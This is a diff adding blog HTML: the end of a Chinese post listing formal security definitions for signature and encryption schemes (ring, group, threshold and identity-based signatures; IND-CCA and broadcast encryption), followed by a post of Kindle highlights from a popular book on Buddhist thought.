+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义proxySignature2.jpg" alt="安全模型定义proxySignature2"></p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义proxySignature3.jpg" alt="安全模型定义proxySignature3"></p>
+<h3 id="Certificateless-Signature-18"><a href="#Certificateless-Signature-18" class="headerlink" title="Certificateless Signature[18]"></a>Certificateless Signature[18]</h3><h3 id="Aggregate-Signature-19"><a href="#Aggregate-Signature-19" class="headerlink" title="Aggregate Signature[19]"></a>Aggregate Signature[19]</h3><h4 id="版本1-1"><a href="#版本1-1" class="headerlink" title="版本1"></a>版本1</h4><p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,m)\rightarrow\sigma$</p>
+<p>$Agg(\sigma_1,\ldots,\sigma_n)\rightarrow\sigma_0$</p>
+<p>$Vrfy((pk_1,m_1),\ldots,(pk_n,m_n),\sigma_0)\rightarrow{1,0}$</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义aggregateSignature.jpg" alt="安全模型定义aggregateSignature"></p>
+<h3 id="Digital-Signature-with-Batch-Verifification-20"><a href="#Digital-Signature-with-Batch-Verifification-20" class="headerlink" title="Digital Signature with Batch Verifification[20]"></a>Digital Signature with Batch Verifification[20]</h3><h3 id="Threshold-Signature-21"><a href="#Threshold-Signature-21" class="headerlink" title="Threshold Signature[21]"></a>Threshold Signature[21]</h3><h4 id="算法定义-2"><a href="#算法定义-2" class="headerlink" title="算法定义"></a>算法定义</h4><p>$KGen(1^\lambda)\rightarrow (pk,(sk_1,\ldots,sk_n))$</p>
+<p>$Sign(sk_i,m)\rightarrow\sigma$</p>
+<p>$Vrfy(pk,m,\sigma,\rightarrow{1,0}$</p>
+<h4 id="鲁棒性"><a href="#鲁棒性" class="headerlink" title="鲁棒性"></a>鲁棒性</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义thresholdSignature.jpg" alt="安全模型定义thresholdSignature"></p>
+<h3 id="Blind-Signature-22"><a href="#Blind-Signature-22" class="headerlink" title="Blind Signature[22]"></a>Blind Signature[22]</h3><p>blindness</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义blindSignature3.jpg" alt="安全模型定义blindSignature3"></p>
+<p>complete完备性</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义blindSignature1.jpg" alt="安全模型定义blindSignature1"></p>
+<p>不可伪造unforgeability</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义blindSignature2.jpg" alt="安全模型定义blindSignature2"></p>
+<h3 id="Ring-Signature-23"><a href="#Ring-Signature-23" class="headerlink" title="Ring Signature[23]"></a>Ring Signature[23]</h3><p>签名后，只知道是群中某个人签名，但不知道具体是谁签的名</p>
+<p>与群签名对比：可以隐藏签名者的信息；不需要群组织者</p>
+<p>$KGen(1^\lambda)\rightarrow (pk,sk)$</p>
+<p>$Sign(sk,m,R[i])\rightarrow\sigma$，其中$R=(pk_1,\ldots,pk_n)$，且对于任意的$s\in [1,n]$有$(pk_s,sk)$合法；$(sk,R[I])$是一个合法的公私钥对</p>
+<p>$Vrfy(M,\sigma,R)\rightarrow{1,0}$</p>
+<h4 id="匿名性anonymity"><a href="#匿名性anonymity" class="headerlink" title="匿名性anonymity"></a>匿名性anonymity</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义ringSignature1.jpg" alt="安全模型定义ringSignature1"></p>
+<h3 id="Group-Signature-24"><a href="#Group-Signature-24" class="headerlink" title="Group Signature[24]"></a>Group Signature[24]</h3><p>$KGen(1^\lambda)\rightarrow(gpk,gmsk,gsk)$，其中$gpk$是群公钥，gmsk是群管理者的私钥，gsk是一个n维向量，每一维代表一个用户的私钥$gsk[i]$</p>
+<p>$Sign(gsk[i],m)\rightarrow\sigma$</p>
+<p>$Vrfy(gpk,m,\sigma)\rightarrow{1,0}$</p>
+<p>$Open(gmsk,m,\sigma)\rightarrow{id,\bot}$</p>
+<h4 id="完全匿名性-full-anonymity"><a href="#完全匿名性-full-anonymity" class="headerlink" title="完全匿名性 full-anonymity"></a>完全匿名性 full-anonymity</h4><p>攻击者拥有访问Open预言机的能力</p>
+<p>攻击者攻击目标为针对特定签名，区分是A还是B生成的签名</p>
+<p>基于IND-CPA游戏</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义groupSignature.jpg" alt="安全模型定义groupSignature"></p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义groupSignature2.jpg" alt="安全模型定义groupSignature2"></p>
+<h4 id="完全可追溯性-full-traceable"><a href="#完全可追溯性-full-traceable" class="headerlink" title="完全可追溯性 full-traceable"></a>完全可追溯性 full-traceable</h4><p>攻击目标为生成一个合法签名</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义groupSignature3.jpg" alt="安全模型定义groupSignature3"></p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义groupSignature4.jpg" alt="安全模型定义groupSignature4"></p>
+<h4 id="其他的安全属性"><a href="#其他的安全属性" class="headerlink" title="其他的安全属性"></a>其他的安全属性</h4><p>不可伪造性unforgeability</p>
+<p>​    所有数字签名都需要满足</p>
+<p>可切除性exculpability</p>
+<p>​    任何一个群中的成员（包括管理员）都不能代表其他成员生成签名</p>
+<p>无连接性 unlinkability</p>
+<p>​    一个实体，看到签名集合后，不能把两个签名与同一个签名者联系起来</p>
+<h3 id="Identity-based-Signature-25"><a href="#Identity-based-Signature-25" class="headerlink" title="Identity-based Signature[25]"></a>Identity-based Signature[25]</h3><h4 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h4><p>参与方：master，user，verifier</p>
+<p>$MKeyGen(1^\lambda)\rightarrow(msk,mpk)$</p>
+<p>$UKeyGen(id,msk,mpk)\rightarrow sk_{id}$</p>
+<p>$Sign(sk_{id},m)\rightarrow\sigma$</p>
+<p>$Vrfy(mpk,m,\sigma,id)\rightarrow{1,0}$</p>
+<p>和定义无明显出入</p>
+<h4 id="EU-CMA-4"><a href="#EU-CMA-4" class="headerlink" title="EU-CMA"></a>EU-CMA</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义idSignature.jpg" alt="安全模型定义idSignature"></p>
+<h3 id="Attribute-based-Signature-26"><a href="#Attribute-based-Signature-26" class="headerlink" title="Attribute-based Signature[26]"></a>Attribute-based Signature[26]</h3><p>一种更为普适的identity-based signature，定义无太大差别不赘述</p>
+<h4 id="EU-CMA-5"><a href="#EU-CMA-5" class="headerlink" title="EU-CMA"></a>EU-CMA</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义attrSignature2.jpg" alt="安全模型定义attrSignature"></p>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><h3 id="Public-Key-Encryption-12"><a href="#Public-Key-Encryption-12" class="headerlink" title="Public-Key Encryption[12]"></a>Public-Key Encryption[12]</h3><p>$SysGen(1^\lambda)\rightarrow SP$</p>
+<p>$KeyGen(SP)\rightarrow(pk,sk)$</p>
+<p>$Enc(SP,pk,M)\rightarrow CT$</p>
+<p>$Dec(SP,sk,CT)\rightarrow M$</p>
+<h4 id="IND-CCA"><a href="#IND-CCA" class="headerlink" title="IND-CCA"></a>IND-CCA</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义Enc1.jpg" alt="安全模型定义Enc1"></p>
+<h4 id="IND-CPA"><a href="#IND-CPA" class="headerlink" title="IND-CPA"></a>IND-CPA</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义Enc2.jpg" alt="安全模型定义Enc2"></p>
+<h3 id="Broadcast-Encryption-27"><a href="#Broadcast-Encryption-27" class="headerlink" title="Broadcast Encryption[27]"></a>Broadcast Encryption[27]</h3><p>某个子集$S$中的所有用户都可以对密文进行解密</p>
+<h4 id="算法定义-3"><a href="#算法定义-3" class="headerlink" title="算法定义"></a>算法定义</h4><p>$KGen(1^\lambda)\rightarrow(pk,SK)$，其中$SK={sk_1,\ldots,sk_n}$</p>
+<p>$Enc(S,pk)\rightarrow (h,K)$，h是广播报文头部，K是对称加密秘钥</p>
+<p>$Enc2(K,M)\rightarrow CT$，是一个对称加密算法</p>
+<p>$Dec(S,i,sk_i,h,pk)\rightarrow K$</p>
+<p>$Dec2(K,CT)\rightarrow M$</p>
+<h4 id="CCA"><a href="#CCA" class="headerlink" title="CCA"></a>CCA</h4><p>只对Enc和Dec进行询问</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义broadcastEnc2.jpg" alt="安全模型定义broadcastEnc2"></p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义broadcastEnc1.jpg" alt="安全模型定义broadcastEnc1"></p>
+<h3 id="Identity-based-Encryption-28"><a href="#Identity-based-Encryption-28" class="headerlink" title="Identity-based Encryption[28]"></a>Identity-based Encryption[28]</h3><h4 id="算法定义-4"><a href="#算法定义-4" class="headerlink" title="算法定义"></a>算法定义</h4><p>$Setup(k)\rightarrow(params,msk)$</p>
+<p>$Extract(params,msk,ID)\rightarrow sk_{ID}$</p>
+<p>$Enc(params,ID,M)\rightarrow CT$</p>
+<p>$Dec(params,ID,CT,sk_{ID})\rightarrow M$</p>
+<h4 id="IND-ID-CCA-IND-IDs-CCA-IND-ID-CPA"><a href="#IND-ID-CCA-IND-IDs-CCA-IND-ID-CPA" class="headerlink" title="IND-ID-CCA IND-IDs-CCA IND-ID-CPA"></a>IND-ID-CCA IND-IDs-CCA IND-ID-CPA</h4><p><img src="E:/技术栈/cryptographic/pic/安全模型定义idEnc1.jpg" alt="安全模型定义idEnc1"></p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义idEnc2.jpg" alt="安全模型定义idEnc2"><img src="/%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89idEnc1.jpg" alt="安全模型定义idEnc1"></p>
+<p><img src="D:\temp\cryptographic\pic\安全模型定义idEnc3.jpg" alt="安全模型定义idEnc3"></p>
+<h3 id="Identity-based-Encryption-with-Traitor-Tracing-29"><a href="#Identity-based-Encryption-with-Traitor-Tracing-29" class="headerlink" title="Identity-based Encryption with Traitor Tracing[29]"></a>Identity-based Encryption with Traitor Tracing[29]</h3><h4 id="算法定义-5"><a href="#算法定义-5" class="headerlink" title="算法定义"></a>算法定义</h4><p>$KeyGen(1^\lambda)\rightarrow(mpk,msk)$</p>
+<p>$Extr(msk,ID,i)\rightarrow sk_i$</p>
+<p>$Enc(mpk,ID,M)\rightarrow CT$</p>
+<p>$Dec(sk_i,ID,CT)\rightarrow M$</p>
+<p>$Trace(msk,ID)\rightarrow T$，其中$T={id_i}$为叛徒的集合</p>
+<h4 id="IND-ID-CCA"><a href="#IND-ID-CCA" class="headerlink" title="IND-ID-CCA"></a>IND-ID-CCA</h4><p>针对Dec部分，与identity-based encryption没有区别</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义idEncTraitor1.jpg" alt="安全模型定义idEncTraitor1"></p>
+<h4 id="IND-ID-CPA"><a href="#IND-ID-CPA" class="headerlink" title="IND-ID-CPA"></a>IND-ID-CPA</h4><p>针对Trace部分，与数字签名类似</p>
+<p><img src="E:/技术栈/cryptographic/pic/安全模型定义idEncTraitor2.jpg" alt="安全模型定义idEncTraitor2"></p>
+<h3 id="Identity-based-Broadcast-Encryption-30"><a href="#Identity-based-Broadcast-Encryption-30" class="headerlink" title="Identity-based Broadcast Encryption[30]"></a>Identity-based Broadcast Encryption[30]</h3><h4 id="算法定义-6"><a href="#算法定义-6" class="headerlink" title="算法定义"></a>算法定义</h4><p>PKG、Alice、Bob</p>
+<p>$KGen(1^\lambda)\rightarrow(msk,mpk)$</p>
+<p>$Extr(msk,ID)\rightarrow sk_{i}$</p>
+<p>$Enc(S,pk)\rightarrow (h,K)$，h是广播报文头部，K是对称加密秘钥</p>
+<p>$Enc2(K,M)\rightarrow CT$，是一个对称加密算法</p>
+<p>$Dec(S,i,sk_i,h,pk)\rightarrow K$</p>
+<p>$Dec2(K,CT)\rightarrow M$</p>
+<h4 id="IND-ID-CCA-1"><a href="#IND-ID-CCA-1" class="headerlink" title="IND-ID-CCA"></a>IND-ID-CCA</h4><p>identity-based encryption和Broadcast encryption简单结合以下就可以</p>
+<h3 id="Inner-Product-Encryption-31"><a href="#Inner-Product-Encryption-31" class="headerlink" title="Inner Product Encryption[31]"></a>Inner Product Encryption[31]</h3><p>$Setup(1^\lambda)\rightarrow(pk,sk)$</p>
+<p>$KeyGen(\vec{v},pk,sk)\rightarrow sk_{\vec{v}}$</p>
+<p>$Enc(M,\vec{x},pk)\rightarrow CT_{\vec{x}}$</p>
+<p>$Dec(CT_{\vec{x}},sk_{\vec{v}},pk)$</p>
+<h3 id="Attribute-based-Encryption-32-33"><a href="#Attribute-based-Encryption-32-33" class="headerlink" title="Attribute-based Encryption[32, 33]"></a>Attribute-based Encryption[32, 33]</h3>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/05/05/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B%E5%AE%9A%E4%B9%89/" data-id="ckob8gj4g0001hsus0c3j5mg7" data-title="密码学-安全模型定义" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-摘抄-佛祖都说了些什么" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/04/26/%E6%91%98%E6%8A%84-%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AF%B4%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/" class="article-date">
+  <time class="dt-published" datetime="2021-04-26T11:16:10.000Z" itemprop="datePublished">2021-04-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/04/26/%E6%91%98%E6%8A%84-%E4%BD%9B%E7%A5%96%E9%83%BD%E8%AF%B4%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88/">摘抄-佛祖都说了些什么</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #61-62的标注 | 添加于 2021年4月20日星期二 上午12:55:24</li>
+</ul>
+<p>老天爷”既不是佛教概念，也不是道教概念，这是一个早在佛教和道教出现之前，中国本土就有的观念：认为“天”是一个有意志的、无所不能的管理者。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #173-174的标注 | 添加于 2021年4月20日星期二 上午1:57:00</li>
+</ul>
+<p>为什么说古人不笨？ 因为人性亘古不变。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #361-362的标注 | 添加于 2021年4月20日星期二 上午2:04:28</li>
+</ul>
+<p>“天地尚不能久，而况于人乎？”[1]说人怎么可能长生不老呢？</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #385-386的标注 | 添加于 2021年4月20日星期二 上午2:05:34</li>
+</ul>
+<p>魏晋玄学家王弼认为，“玄学”的“玄”字是“远”的意思。那么，“玄学”的字面意思就可以理解成“高远之学”，远离现实之学，也就是形而上学[4]</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #394-396的标注 | 添加于 2021年4月20日星期二 上午2:05:54</li>
+</ul>
+<p>在人类出现之前，那时候还没有人类的思维和语言，可世界早已经存在了。可见这个世界是能够超越人类语言和思维存在的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #471-472的标注 | 添加于 2021年4月20日星期二 上午2:14:48</li>
+</ul>
+<p>在大众的精神领域里，用来解决人生痛苦的主要方式并不是老庄玄学，而是人生小感悟和心理医生。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #473-473的标注 | 添加于 2021年4月20日星期二 上午2:15:00</li>
+</ul>
+<p>空虚和恐慌像幽灵一样徘徊在城市上空，时不时狠狠击中某一个正在思考人生的凡人</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #613-615的标注 | 添加于 2021年4月20日星期二 上午3:20:36</li>
+</ul>
+<p>“万法缘起”还能推出另一个更重要的结论。 既然一切事物都是随因缘而起，那就是说，这些事物不能脱离因缘而存在。只有适当的因缘在适当的时候出现了，都凑齐了，相应的事物才出现。等因缘消失了，事物也就随着消失了</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #621-623的标注 | 添加于 2021年4月20日星期二 上午3:20:57</li>
+</ul>
+<p>所有事物都“没有自性”这件事，用佛学语言说就是： “法无自性” —意思是世间万物都不能脱离因缘独立存在。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #624-627的标注 | 添加于 2021年4月20日星期二 上午3:21:10</li>
+</ul>
+<p>事物一直处于变化的状态中，不能永恒存在，在佛学里叫作“无常”。 那么“法无自性”可以进一步总结成： “万法无常” —世间万物都是随时生灭，不能永恒存在的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #629-633的标注 | 添加于 2021年4月20日星期二 上午3:21:39</li>
+</ul>
+<p>假如万法无常—假如说世间万物都不是永恒的，那“我”也是属于万物，自然可以推出，“我”也是无常的，是有生有灭，不是永恒不变的。 佛教里的术语，叫作“无我”。 假如我们把这个“我”理解成就是我的肉体的话，那么这句话就是在说，人总有死亡，肉体总会泯灭。道教追求的是人体永生不死，这在佛教看来，就是不可能的，是违反“万法缘起”这规律的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #659-662的标注 | 添加于 2021年4月20日星期二 上午3:22:39</li>
+</ul>
+<p>但是佛教发现，世人大都很愚蠢，看不出世界无常的本质，误以为自己和万物都是永恒存在的。用佛教的术语来说，这就是起了“执著”心，固执的认为万法实有。 认为万物实有，用佛教的术语来说叫作“法执”。 认为“我”实有，术语叫作“我执”。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #662-663的标注 | 添加于 2021年4月20日星期二 上午3:22:57</li>
+</ul>
+<p>人产生了“法执”和“我执”的念头，就会产生贪婪之心：</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #669-672的标注 | 添加于 2021年4月20日星期二 上午3:23:23</li>
+</ul>
+<p>佛教认为，人因为满足不了自己欲望，所以才会痛苦。 所以人要从痛苦中解脱，就要学习佛教的理论，认识到“万法无常”的本质，破除了“我执”和“法执”之心。那么就消除了欲望，也就没有了痛苦，也就解脱了。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #676-678的标注 | 添加于 2021年4月20日星期二 上午3:23:45</li>
+</ul>
+<p>从佛理上说，不是人们“不得不”去消除欲望。而是因为世间万物的本质就是虚妄不实的，欲望压根就是不该产生的。所以，僧人不是“不得不”去消除欲望，而是认为这世上本没有事物值得贪恋，所以摒弃欲望是最自然不过的事。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #839-843的标注 | 添加于 2021年4月20日星期二 上午3:32:44</li>
+</ul>
+<p>轮回。 轮回的意思就像我们一般人理解的那样：人以及其他生物（植物和细菌除外）在死亡后，还会获得新的生命。相当于我们俗称的“投胎”。 佛教的大部分宗派主张“六道轮回”，意思是，世上的生命一共有六类，包括天人（类似于神仙）、人类、畜生、饿鬼等等。生物可以从一道轮回到另一道。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #858-858的标注 | 添加于 2021年4月20日星期二 上午3:41:16</li>
+</ul>
+<p>菩萨畏因，众生畏果</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #878-879的标注 | 添加于 2021年4月20日星期二 上午6:27:55</li>
+</ul>
+<p>为了要求信徒修行，任何宗教都不会认同决定论。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #937-939的标注 | 添加于 2021年4月20日星期二 上午6:53:11</li>
+</ul>
+<p>劳思光先生的举的例子是：口渴是一种苦。人在饮水的时候，是因为停止了口渴之苦，所以才感到了暂时的快乐。假如没有口渴这种苦，单单是饮水这个行为本身，是不能带来快乐的。否则的话，人持续不停的饮水就可以获得不断的快乐，这显然是不可能的</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #940-941的标注 | 添加于 2021年4月20日星期二 上午6:53:20</li>
+</ul>
+<p>乐只是伴随着苦而产生的事物，苦比乐更为根本。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #961-965的标注 | 添加于 2021年4月20日星期二 下午11:57:17</li>
+</ul>
+<p>第一个因缘“无明”，意思是凡人不了解佛法，不了解“万法缘起”的规律，不了解世间万物“无常”的本质。 第二个因缘叫作“行”，指的是我们前世做出的“业”。它是由第一个因缘导致的，因为我们前世“无明”，不懂得按照佛的指导修行，所以才会做出种种“业”来。 第三个因缘叫作“识”，指的是我们的生命“种子”进入了父母的受精卵（当然最初的佛教没有“受精卵”这种生理学术语），这才产生了“我”今生的生命。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #969-972的标注 | 添加于 2021年4月20日星期二 下午11:57:38</li>
+</ul>
+<p>因为有了“识”这个种子，所以受精卵才会发育（第四个因缘），才会有我们种种的感官（第五、六、七个因缘）。又因为我们有种种感官，才会有种种欲望（第八个因缘）。因为有欲望，就会做一些事去满足自己的欲望（第九、十个因缘），就相当于造“业”。最后生命死亡（第十二个因缘），死后还会有来生（第十一个因缘），从而完成一个轮回。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #978-985的标注 | 添加于 2021年4月20日星期二 下午11:58:23</li>
+</ul>
+<p>佛教具体的修行方法，概括说有三种： 戒、定、慧。 “戒”指的是遵守戒律，约束自己的行为。从浅薄的角度说，就是多做好事少做坏事，那么根据因果报应理论，可以让自己未来得到善报。从更深的角度说，通过“戒”约束自己的行为让自己少造业，也就能接近涅槃的目标。 “定”指的是打坐禅定，一方面能增加人对自己的约束力，另一方面有助于思考，有助于领悟智慧从而不再“无明”。 “慧”指的是开启智慧。也就是学习佛法，认识世界的本质，不再“无明”。 前面说了，佛教认为开启智慧，不再“无明”是解脱的根本方法。因此在三学中，“慧”最为重要，其他两法都是为了能更好的“慧”。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1169-1170的标注 | 添加于 2021年4月21日星期三 上午12:05:30</li>
+</ul>
+<p>世界万物不都是因缘聚合的结果吗？那么，过去事物的因缘已经散掉，是虚无的。未来事物的因缘还没有聚合，也是虚无的。只有事物此时此刻的因缘是聚合的，所以此瞬不是空的，是实有的</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1658-1660的标注 | 添加于 2021年4月21日星期三 上午2:32:28</li>
+</ul>
+<p>那事物的本质到底是什么呢？中观学认为，是“假有”。 “假有”的大致意思是，我们既不认为事物是永存不变的，也不认为事物是不存在的。我们认为，事物存在，但不是永存不变的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1661-1663的标注 | 添加于 2021年4月21日星期三 上午2:32:47</li>
+</ul>
+<p>那么，当佛教说我们要破除“我执”和“法执”的时候，意思并不是让我们把一切都看成完全的不存在。我们认同事物是存在的，我们是通过认识到事物无常的一面，来意识到它的虚幻。 事物存在，但不值得我们依恋。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1665-1669的标注 | 添加于 2021年4月21日星期三 上午2:32:58</li>
+</ul>
+<p>唯物主义偏向于“假有”中“有”的一面。认为虽然物质是暂存的，但物质仍旧是世界的基础和本质。桌子的分子虽然每一秒都在变化，最终整个桌子都会消失。但它对我们的日常生活是相对稳定的。它“无常”的一面并不影响我们去暂时称呼、研究和使用它。 中观学偏向于“假有”中“假”的一面。认为既然人和事物都是暂存的，那么就不值得追求依恋。桌子虽然存在，但不值得我们占有。因为无论“我”还是桌子最终都会消失，一切都会成空。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1689-1691的标注 | 添加于 2021年4月21日星期三 上午2:34:35</li>
+</ul>
+<p>但对于佛教来说，人无论此生还是来世，本质都是相同的，都是“假有”。死亡这个事件并不会改变人的本质。不是说人死了才进入“假有”的状态，而是认为人平时活着的每一刻，都是“假有”的。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1767-1768的标注 | 添加于 2021年4月21日星期三 上午6:24:55</li>
+</ul>
+<p>如果想准确的定义事物的本质，就得像龙树的“八不中道”那样，不断地说事物不是什么，而没法直接说事物是什么</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1798-1800的标注 | 添加于 2021年4月21日星期三 上午6:26:11</li>
+</ul>
+<p>佛教明确告诉我们，终极真理是存在的，是永恒的。它的名字叫作“佛性”（当然，“佛性”这个词也只是用来指代真理的假名）。 佛性就是修行佛法追求的目标。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1852-1854的标注 | 添加于 2021年4月21日星期三 上午6:28:04</li>
+</ul>
+<p>真正的无欲，是既不“喜欢”，又不“不喜欢”。 这是什么状态？ 这就是“不在乎”的状态。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1902-1903的标注 | 添加于 2021年4月21日星期三 上午6:46:15</li>
+</ul>
+<p>小乘要么认为万物或者“我”是实有的，要么认为万物是彻底的虚无。而大乘认为，万物的本质是一种永远不能正面描述的状态，这个状态叫作“空”。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1919-1921的标注 | 添加于 2021年4月21日星期三 上午7:40:01</li>
+</ul>
+<p>菩萨的特点是，菩萨都有大慈悲心，以普度众生为己任。菩萨已经有能力成佛，但他们拒绝立刻成佛。而是许下一个心愿，叫作“本愿”，要等自己的本愿实现以后才能成佛。大部分菩萨许下的本愿，都是要让世间众生全部修行圆满。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #1999-2000的标注 | 添加于 2021年4月21日星期三 上午7:47:04</li>
+</ul>
+<p>用杜继文先生的话说：“佛籍的产生，既不需要圣人，也无需乎天启，只要附上一句‘如是我闻’，随时随地都可以生产；至于随意改经，更是常事。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2027-2028的标注 | 添加于 2021年4月21日星期三 上午7:57:29</li>
+</ul>
+<p>未曾有一法，不从因缘生，是故一切法，无不是空者。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2137-2138的标注 | 添加于 2021年4月21日星期三 上午9:34:03</li>
+</ul>
+<p>百丈怀海“不昧因果”这个回答的意思是说：修行得道的人还是会承受因果报应的，只不过他们能知晓自己所受报应的由来，坦然接受。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2592-2593的标注 | 添加于 2021年4月21日星期三 下午11:59:38</li>
+</ul>
+<p>须是教皇亲授的。 但在中国实用主义太重要了。假如我们把佛教的道德当作优劣标准的话，那么中国的政坛就是个不断逆向淘汰的世界。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2594-2595的标注 | 添加于 2021年4月21日星期三 下午11:59:50</li>
+</ul>
+<p>如果一个帝王非要相信佛教温厚戒杀，那么他很快就会被另一个不择手段的人取而代之。久而久之，政坛上所有虔诚信佛的人，就都被淘汰了。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2716-2717的标注 | 添加于 2021年4月22日星期四 上午12:05:06</li>
+</ul>
+<p>西游记》里，皇帝亲切的拉着唐僧的手称呼“御弟”，这样的情景在真实的历史中也有可能发生。只不过在两人亲切笑容的背后，一个人多了份自大傲慢，另一个人多了份胆战心惊。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2913-2917的标注 | 添加于 2021年4月22日星期四 上午2:20:07</li>
+</ul>
+<p>我们讲玄奘的这些经历是要说明，玄奘的冒险不是印第安纳·琼斯那种，英雄站在洞窟面前快乐的说“我们来探险吧！”的浪漫主义故事。整个冒险是由一系列超越常人理性的决定组成的，只有坚强的意志才能抵御住其中的危险和诱惑。拥有这种极端意志的人无疑是强大的，也是可怕的。 特别是在他认为自己绝对正确的时候。</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2934-2935的标注 | 添加于 2021年4月22日星期四 上午3:43:59</li>
+</ul>
+<p>假如如“万法缘起”所说，“我”是“空”的，那当“我”死后，到底是谁在轮回呢？</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
+<li>您在位置 #2978-2979的标注 | 添加于 2021年4月22日星期四 上午3:46:17</li>
+</ul>
+<p>学认为中观太过强调“空”了，其最大的危险就在于，如果一切都是“空”的话，那么轮回的主体到底是谁？当我们说普度众生的时候，我们普度的到底是谁？</p>
+<p>佛祖都说了些什么? (林欣浩)</p>
+<ul>
